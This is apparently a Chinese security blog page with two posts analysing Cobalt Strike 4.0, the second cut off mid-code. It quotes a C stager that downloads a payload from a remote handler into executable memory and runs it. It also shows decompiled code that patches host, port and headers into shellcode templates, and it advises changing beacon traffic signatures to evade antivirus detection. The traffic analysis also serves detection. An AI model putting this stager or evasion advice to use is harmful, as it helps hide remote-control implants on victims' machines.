<p>​        执行payload的方式分为两种，一种是分阶段加载（Staged）和不分阶段加载（STAGELESS ）。当使用分阶段加载的方式时，一般把程序分为两个部分，stager和stage，stager通常是一个代码量非常小的精简过的汇编代码，它的作用非常简单，就是用来下载stage并载入到内存,也就是主要完成下载远程的stage文件和分配内存将stage加载到内存并执行的功能。在cobaltstrike的官方博客中，给出了一个简单的stager的代码,主要通过C语言实现，通过wsconnect来和远程的地址建立socket通信，下载远程的文件分配内存并载入到内存，最后通过函数指针的形式来进行调用。之所以这么做主要是为了解决payload大小限制的问题。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* connect to the handler *&#x2F;</span><br><span class="line">SOCKET my_socket &#x3D; wsconnect(argv[1], atoi(argv[2]));</span><br><span class="line"> </span><br><span class="line">&#x2F;* read the 4-byte length *&#x2F;</span><br><span class="line">int count &#x3D; recv(my_socket, (char *)&amp;size, 4, 0);</span><br><span class="line">if (count !&#x3D; 4 || size &lt;&#x3D; 0)     punt(my_socket, &quot;read a strange or incomplete length value\n&quot;); &#x2F;* allocate a RWX buffer *&#x2F; buffer &#x3D; VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (buffer &#x3D;&#x3D; NULL)     punt(my_socket, &quot;could not allocate buffer\n&quot;); &#x2F;* prepend a little assembly to move our SOCKET value to the EDI register    thanks mihi for pointing this out    BF 78 56 34 12     &#x3D;&gt;      mov edi, 0x12345678 *&#x2F;</span><br><span class="line">buffer[0] &#x3D; 0xBF;</span><br><span class="line"> </span><br><span class="line">&#x2F;* copy the value of our socket to the buffer *&#x2F;</span><br><span class="line">memcpy(buffer + 1, &amp;my_socket, 4);</span><br><span class="line"> </span><br><span class="line">&#x2F;* read bytes into the buffer *&#x2F;</span><br><span class="line">count &#x3D; recv_all(my_socket, buffer + 5, size);</span><br><span class="line"> </span><br><span class="line">&#x2F;* cast our buffer as a function and call it *&#x2F;</span><br><span class="line">function &#x3D; (void (*)())buffer;</span><br><span class="line">function();</span><br></pre></td></tr></table></figure>

<p>​        我们再了解一下为什么要使用分阶段的方式呢？根据作者的描述有以下几点</p>
<ul>
<li>为了解决文件文件大小的问题，另一方面为了和Metasploit兼容</li>
<li>通常stager作为一个加载器并没有做安全处理，而stage则会做比较好的处理，一般如果别人捕获了stager样本并不会造成什么影响。所以使用分阶段的形式也是为了保护stage</li>
</ul>
<p><strong>stageless payload</strong></p>
<p>​        stageless payload顾名思义就是无阶段payload,那么既然我们已经介绍了关于使用分阶段执行payload的好处，为什么还要再去使用无阶段执行payload呢？原因是在内网横向渗透的过程中，因为目标内网的主机可能无法和外网通信，这个时候如果还使用分阶段执行，目标内网的断网机将无法下载到stage。所以在内网渗透的过程中一般使用的是无阶段的payload。</p>
<p><strong>beacon</strong></p>
<p>​        beacon运行在目标主机的用于远程控制的payload，主要用来实现稳定控制目标的功能，并不会实时和cobaltstrike服务端通信，在一段时间后会去检测是否有任务，如果有任务，beacon就会下载任务并且执行。当存在任务时，beacon一般会通过http去输出请求结果，可以通过http或者dns来检查是否有任务。</p>
<h3 id="beacon通信分析"><a href="#beacon通信分析" class="headerlink" title="beacon通信分析"></a>beacon通信分析</h3><h4 id="staged-payload"><a href="#staged-payload" class="headerlink" title="staged payload"></a>staged payload</h4><p>​        我使用wireshark进行分析，当我执行cobaltstrike生成的分阶段执行的payload时，首先会发起一个http请求，他会请求我们建立的listener端口，返回一个很大的内容</p>
<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901182559711.png" alt="image-20200901182559711"></p>
<p>​        这个请求我们也可以在web日志中查看到</p>
<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901182724592.png" alt="image-20200901182724592"></p>
<p>​        通过我们之前对分阶段执行payload的了解，我们可以知道这个是去请求stage的请求，我手工请求了以下这个地址，并且将下载后的文件保存为dll文件，将这个dll文件和beacon.dll文件进行对比，发现这两个文件大小基本一致，因此基本可以确定这个请求的开始是加载了beacon.dll这个文件。</p>
<p>​        继续看其他请求包，我们发现当通过get请求activity这个路径，会刷新beacon的时间。</p>
<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901193704075.png" alt="image-20200901193704075"></p>
<p>​        我尝试在和beacon进行交互，执行一个ipconfig命令，再抓包进行分析，当要执行命令时，我们可以看到当去请求activity这个路径时，已经有了返回内容</p>
<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901194454763.png" alt="image-20200901194454763"></p>
<p>​        我们再看下一个包， 可以看到beacon向服务端发起一个post请求，路径为submit.php，并且带有id参数，请求内容为加密后的内容。</p>
<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901194558581.png" alt="image-20200901194558581"></p>
<p>​        我尝试进行文件操作，发现传输返回结果还是通过向服务端以post形式请求submit.php。所以看到这里大家知道为什么我们明明免杀都过了，一执行就会被360干掉了，我如果是360，我也知道看有没有通过请求active和submit提交一些加密代码来判断是不是cs的shell了，所以做免杀的时候一定要去改流量特征。</p>
<h4 id="stageless-payload"><a href="#stageless-payload" class="headerlink" title="stageless payload"></a>stageless payload</h4><p>​        我们再生成一个无阶段的payload执行，再看看通信的流程。</p>
<p>​        当我执行生成的无阶段的payload时，我发现并没有发送其他包，而是只发送了一个get请求请求match这个路径。当请求了match这个路径，服务端的延时就会刷新一次，所以我们知道这个请求是获取服务端执行命令的请求。</p>
<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901195732678.png" alt="image-20200901195732678"></p>
<p>​        当我们执行ipconfig这个命令后，通过抓包分析，我们发现match会返回一个结果，这个就是需要执行的命令。</p>
<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901200101283.png" alt="image-20200901200101283"></p>
<p>​        再看这个请求的下一个数据包，会去请求submit.php，去传递命令执行的结果</p>
<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901200145700.png" alt="image-20200901200145700"></p>
<p>​        所以我们可以知道再cobaltstrike4.0中，如果使用无阶段的payload放到目标主机执行，会在请求过程中发送大量请求match和submit.php的数据包，这个就可以当作一个流量特征来进行处理。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        通过关于beacon的流量分析，我们应该了解了关于beacon通信和加载的方式，也应该明白了为什么我们使用CobaltStrike一定要改流量特征了吧。</p>
<p><strong>参考文章</strong></p>
<p><a href="https://blog.cobaltstrike.com/2013/06/28/staged-payloads-what-pen-testers-should-know/" target="_blank" rel="noopener">Staged Payloads – What Pen Testers Should Know</a></p>
<p><a href="https://blog.cobaltstrike.com/2016/06/15/what-is-a-stageless-payload-artifact/" target="_blank" rel="noopener">What is a stageless payload artifact?</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">关于CobaltStrike生成shell的过程和执行流程的分析学习</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-08-31 17:21:58" itemprop="dateCreated datePublished" datetime="2020-08-31T17:21:58+08:00">2020-08-31</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-09-02 20:09:56" itemprop="dateModified" datetime="2020-09-02T20:09:56+08:00">2020-09-02</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/cobaltstrike/" itemprop="url" rel="index">
                    <span itemprop="name">cobaltstrike</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​        可能我们在后渗透阶段使用CobaltStrike使用的是比较多的，关于一款工具，我们不仅仅只能停留在如何使用它，我们也应该了解一下它实现的原理，本文将带着大家和我一起学习关于CoblatStrike这款工具shell生成的过程还有执行流程。我这里是以CobaltStrike4.0为例来进行分析的。</p>
<p>​        首先我们将CobaltStrike导入到IDEA中，对着CobaltStrike.jar右键选择-add as libirary,那样我们就可以在IDEA中查看这个包反编译的代码，IDEA反编译代码的还原度还是非常高的。</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831173535104.png" alt="image-20200831173535104"></p>
<h3 id="payload-generator"><a href="#payload-generator" class="headerlink" title="payload generator"></a>payload generator</h3><p>​        CobaltStrike所有的ui在aggressor\dialogs\目录下，因此我们如果想要知道在我们点击了某个按键后CobaltStrike执行了什么操作，在这个目录下找就可以了，因为我们想查看在生成paylad的时候执行了什么操作，因此找payload generator就可以了，我们先看一下dialogAction这个方法中的逻辑。</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831174257725.png" alt="image-20200831174257725"></p>
<p>​        这个逻辑我们根据生成payload的窗口可能更好理解一些,我把我的分析写到注释里</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831174544179.png" alt="image-20200831174544179"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">public void dialogAction(ActionEvent var1, Map var2) &#123;</span><br><span class="line">    this.options &#x3D; var2;</span><br><span class="line">    boolean var3 &#x3D; DialogUtils.bool(var2, &quot;x64&quot;); &#x2F;&#x2F;判断是否生成x64的payload</span><br><span class="line">    String var4 &#x3D; DialogUtils.string(var2, &quot;listener&quot;); &#x2F;&#x2F;接收listener的值</span><br><span class="line">    this.stager &#x3D; ListenerUtils.getListener(this.client, var4).getPayloadStager(var3 ? &quot;x64&quot; : &quot;x86&quot;); &#x2F;&#x2F;首先调用getListener获取到Listener，再调用getPayloadStager获取stager</span><br><span class="line">    if (this.stager.length &#x3D;&#x3D; 0) &#123; &#x2F;&#x2F;判断stager是否生成成功，如果为空，则报错</span><br><span class="line">        if (var3) &#123;</span><br><span class="line">            DialogUtils.showError(&quot;No x64 stager for listener &quot; + var4);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            DialogUtils.showError(&quot;No x86 stager for listener &quot; + var4);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        Map var5 &#x3D; DialogUtils.toMap(&quot;ASPX: aspx, C: c, C#: cs, HTML Application: hta, Java: java, Perl: pl, PowerShell: ps1, PowerShell Command: txt, Python: py, Raw: bin, Ruby: rb, COM Scriptlet: sct, Veil: txt, VBA: vba&quot;);  &#x2F;&#x2F;将内容转换为Map形式</span><br><span class="line">        String var6 &#x3D; DialogUtils.string(var2, &quot;format&quot;); &#x2F;&#x2F;从var2这个hashmap中获取键为format对应的值</span><br><span class="line">        String var7 &#x3D; &quot;payload.&quot; + var5.get(var6); &#x2F;&#x2F;拼接内容大概是payload.format</span><br><span class="line">        SafeDialogs.saveFile((JFrame)null, var7, this); &#x2F;&#x2F;调用save方法</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​            我们将下面这句代码扩展分析一下，getListener故名思意就是获取Listener，跟进去后发现会返回一个SCListener对象。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this.stager &#x3D; ListenerUtils.getListener(this.client, var4).getPayloadStager(var3 ? &quot;x64&quot; : &quot;x86&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831181115893.png" alt="image-20200831181115893"></p>
<p>​        我们主要关注一下getPayloadStager是如何运行的，跟进后发现getPayloadStager仅仅返回了Stagers.shellcode的执行结果</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831181157627.png" alt="image-20200831181157627"></p>
<p>​        跟进shellcode方法，执行了两个操作，首先调用resolve方法进行解析，返回一个GenericStager对象，再调用这个对象的generate方法。</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831181808133.png" alt="image-20200831181808133"></p>
<p>​        跟进resolve看看执行了什么操作，在if中会判断var3是否是x86结构，如果是将this.x86_stagers赋值给var4,再判断var6是否包含var2关键字，如果包含，则调用create方法。</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831191822995.png" alt="image-20200831191822995"></p>
<p>​        我们先看看x86_stagers是怎么来的，在Stagers类的开始创建了X86_stagers和x64_stagers，并且调用了Stagers（）这个构造方法，我们可以看到在这个方法中调用了add方法来执行操作</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831192312035.png" alt="image-20200831192312035"></p>
<p>​        再跟进去看看add方法执行了什么操作,首先通过掉用TestAech方法判断是否含有x86或x64,如果正常以后再判断是否是x86，如果是则向x86_stagers则以键值对的形式写入内容，如果不是则向x64_stagers写入内容。</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831192737834.png" alt="image-20200831192737834"></p>
<p>​        我们选择一个BeaconHTTPStagerX86来看看，payload函数执行了什么操作，通过下面的代码可以看到返回了windows/beacon_http/reverse_http，其他的payload函数返回的内容类似，就不一一举例了。</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831193156043.png" alt="image-20200831193156043"></p>
<p>​        那么var1的内容是什么呢？还是以http x86的stager为例，我们发现它是new BeaconHTTPStagerX86（）后返回的结果。</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831203310084.png" alt="image-20200831203310084"></p>
<p>​        那么BeaconHTTPStagerX86在构造方法中又做了什么操作呢，我们通过下面的代码可以看到它调用了父类GenericHTTPStagerX86的构造方法</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831203430325.png" alt="image-20200831203430325"></p>
<p>​        跟进GenericHTTPStagerX86的构造方法，发现其又调用了父类GenericHTTPStager的构造方法</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831203519702.png" alt="image-20200831203519702"></p>
<p>​        跟进GenericHTTPStager的构造方法，发现其又调用了父类GenericStager的构造方法</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831203558124.png" alt="image-20200831203558124"></p>
<p>​        在GenericStager方法中，可以看到其实什么也没做</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831203712286.png" alt="image-20200831203712286"></p>
<p>​        最后其实比较关键的代码是调用了generate方法</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831203932934.png" alt="image-20200831203932934"></p>
<p>​        因为我的listener是http x86的listener，所以最终调用stagers\GenericHTTPStager.class的generate方法如下，</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831204215357.png" alt="image-20200831204215357"></p>
<p>​        在该代码种首先通过resouce方法加载资源，资源文件，资源文件是通过getStagetFile()获得的，在GenericHTTPStager.class中的getStagetFile是一个抽象方法，而且GenericHTTPStager也是一个抽象类，所以我们要在继承了GenericHTTPStager的子类中寻找getStagetFile的实现，最终在GenericHTTPStagerX86找到了getStagetFile的实现，是加载resources/httpstager.bin文件</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901094550546.png" alt="image-20200901094550546"></p>
<p>​        下面的代码中,读取httpstager.bin文件的内容，并且对其中的某些值进行替换，httpstager.bin其实就是shellcode生成的一个模板文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">public byte[] generate() &#123;</span><br><span class="line">       try &#123;</span><br><span class="line">           InputStream var1 &#x3D; CommonUtils.resource(this.getStagerFile());  &#x2F;&#x2F;读取httpstager.bin的内容</span><br><span class="line">           byte[] var2 &#x3D; CommonUtils.readAll(var1);</span><br><span class="line">           String var3 &#x3D; CommonUtils.bString(var2); &#x2F;&#x2F;从byte类型转换为字符串类型</span><br><span class="line">           var1.close();</span><br><span class="line">           var3 &#x3D; var3 + this.getListener().getStagerHost() + &#39;\u0000&#39;; &#x2F;&#x2F;从option中获取host</span><br><span class="line">           Packer var4 &#x3D; new Packer();  &#x2F;&#x2F;类中内置了对于字符串，字节，hex等处理的方法</span><br><span class="line">           var4.little(); &#x2F;&#x2F;字节顺序，决定大端字节和小端字节的读取问题</span><br><span class="line">           var4.addShort(this.getListener().getPort()); &#x2F;&#x2F;从option中获取port值</span><br><span class="line">           AssertUtils.TestPatchS(var2, 4444, this.getPortOffset()); &#x2F;&#x2F;判断getPortOffset的对应的值是否是4444</span><br><span class="line">           var3 &#x3D; CommonUtils.replaceAt(var3, CommonUtils.bString(var4.getBytes()), this.getPortOffset()); &#x2F;&#x2F;将4444替换为option设置的端口地址</span><br><span class="line">           var4 &#x3D; new Packer();</span><br><span class="line">           var4.little();</span><br><span class="line">           var4.addInt(1453503984); &#x2F;&#x2F;exit对应的偏移地址</span><br><span class="line">           AssertUtils.TestPatchI(var2, 1453503984, this.getExitOffset());</span><br><span class="line">           var3 &#x3D; CommonUtils.replaceAt(var3, CommonUtils.bString(var4.getBytes()), this.getExitOffset()); &#x2F;&#x2F;exit对应的偏移地址替换，不过这个看起来默认是没变的</span><br><span class="line">           var4 &#x3D; new Packer();</span><br><span class="line">           var4.little();</span><br><span class="line">           var4.addShort(this.getStagePreamble());&#x2F;&#x2F;在getStagePreamble中判断是否为forign类型，如果不是，则返回stage_offset。</span><br><span class="line">           AssertUtils.TestPatchS(var2, 5555, this.getSkipOffset()); &#x2F;&#x2F;判断getSkipOffset的返回值是否是5555</span><br><span class="line">           var3 &#x3D; CommonUtils.replaceAt(var3, CommonUtils.bString(var4.getBytes()), this.getSkipOffset()); &#x2F;&#x2F;将stage_offset的值进行替换</span><br><span class="line">           var4 &#x3D; new Packer();</span><br><span class="line">           var4.little();</span><br><span class="line">           var4.addInt(this.getConnectionFlags());  &#x2F;&#x2F;判断是否是https</span><br><span class="line">           AssertUtils.TestPatchI(var2, this.isSSL() ? -2069876224 : -2074082816, this.getFlagsOffset());</span><br><span class="line">           var3 &#x3D; CommonUtils.replaceAt(var3, CommonUtils.bString(var4.getBytes()), this.getFlagsOffset());</span><br><span class="line">           String var5;</span><br><span class="line">           if (CommonUtils.isin(CommonUtils.repeat(&quot;X&quot;, 303), var3)) &#123;</span><br><span class="line">               var5 &#x3D; this.getConfig().pad(this.getHeaders() + &#39;\u0000&#39;, 303);</span><br><span class="line">               var3 &#x3D; CommonUtils.replaceAt(var3, var5, var3.indexOf(CommonUtils.repeat(&quot;X&quot;, 127))); &#x2F;&#x2F;将hreader中的值进行替换</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           int var6 &#x3D; var3.indexOf(CommonUtils.repeat(&quot;Y&quot;, 79), 0);</span><br><span class="line">           var5 &#x3D; this.getConfig().pad(this.getURI() + &#39;\u0000&#39;, 79);</span><br><span class="line">           var3 &#x3D; CommonUtils.replaceAt(var3, var5, var6); &#x2F;&#x2F;从config中获取url的值，并进行替换</span><br><span class="line">           return CommonUtils.toBytes(var3 + this.getConfig().getWatermark()); &#x2F;&#x2F;以字节数组的形式返回</span><br><span class="line">       &#125; catch (IOException var7) &#123;</span><br><span class="line">           MudgeSanity.logException(&quot;HttpStagerGeneric: &quot; + this.getStagerFile(), var7, false);</span><br><span class="line">           return new byte[0];</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>​        通过上面的分析，我们可以看出来，这里所作的操作就是读取httpstager.bin这个模板文件，然后对模板文件中的请求地址，请求头等地方进行替换。</p>
<p>​        再回到aggressor\dialogs\PayloadGeneratorDialog.class中，我们看下dialogResult方法,这个方法会针对我们选择不同的shellcode的生成类型，将stager转换为不同的类型，最后写入到文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">public void dialogResult(String var1) &#123;</span><br><span class="line">      String var2 &#x3D; DialogUtils.string(this.options, &quot;format&quot;);</span><br><span class="line">      